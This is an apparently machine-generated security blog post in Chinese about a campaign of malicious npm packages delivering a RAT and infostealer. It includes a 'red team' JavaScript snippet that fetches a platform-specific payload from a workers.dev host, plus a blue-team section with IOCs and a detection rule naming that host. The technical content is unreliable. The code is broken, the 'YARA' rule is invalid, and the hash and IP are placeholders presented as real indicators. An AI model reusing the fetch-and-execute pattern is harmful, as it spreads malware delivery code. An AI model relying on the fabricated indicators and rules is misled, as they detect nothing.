---
layout: post
title:  "Nearly 800 Malicious npm Packages Deliver Cross-Platform RAT and Infostealer"
date:   2026-08-08 01:03:56 +0000
categories: [security]
severity: critical
---

# 🚨 解析 npm 註冊表惡意軟體攻擊：跨平台遠端存取木馬與資訊竊取

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 與 Info Leak
> * **關鍵技術**: `npm` 套件註冊表攻擊、AI 生成的 typo-squatting 套件名稱、Cloudflare Workers、DNS TXT 記錄下載payload

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 惡意軟體攻擊者透過在 `npm` 註冊表中發布近 800 個惡意套件，利用 `require()` 函數下載並執行惡意程式碼。
* **攻擊流程圖解**:
  1. 使用者安裝惡意套件
  2. 套件中的 `README` 文件指示使用者使用 `require()` 函數載入套件
  3. `require()` 函數下載並執行惡意程式碼
  4. 惡意程式碼下載並執行 `WEL1DROPPER` 下載器
  5. `WEL1DROPPER` 下載器根據主機作業系統和處理器架構下載相應的 payload
* **受影響元件**: 所有使用 `npm` 套件的 Windows、Mac、Linux 系統

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要使用者安裝惡意套件
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意套件中的 payload 建構邏輯
    const os = require('os');
    const arch = require('arch');
    const https = require('https');
    
    const payloadUrl = `https://oob-worker.cf103-070.workers.dev/${os.platform()}-${arch()}`;
    https.get(payloadUrl, (res) => {
      const payload = res.body;
      // 執行 payload
    });
    
    ```
* **繞過技術**: 惡意軟體攻擊者使用 AI 生成的 typo-squatting 套件名稱來繞過安全檢查

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.0.2.1 | oob-worker.cf103-070.workers.dev | /usr/lib/node_modules/evil-package |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule evil_package {
      meta:
        description = "惡意套件偵測"
        author = "Blue Team"
      strings:
        $a = "oob-worker.cf103-070.workers.dev"
      condition:
        $a in (http.request.uri)
    }
    
    ```
* **緩解措施**: 刪除惡意套件、更新 `npm` 套件、設定 `npm` 套件安全檢查

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **npm (Node Package Manager)**: Node.js 的套件管理器，允許使用者安裝和管理套件。
* **typo-squatting**: 一種攻擊手法，攻擊者註冊與合法域名類似的域名，以便攔截用戶的輸入錯誤。
* **Cloudflare Workers**: 一種無伺服器計算平台，允許使用者在 Cloudflare 的邊緣節點上執行自定義程式碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/08/nearly-800-malicious-npm-packages.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


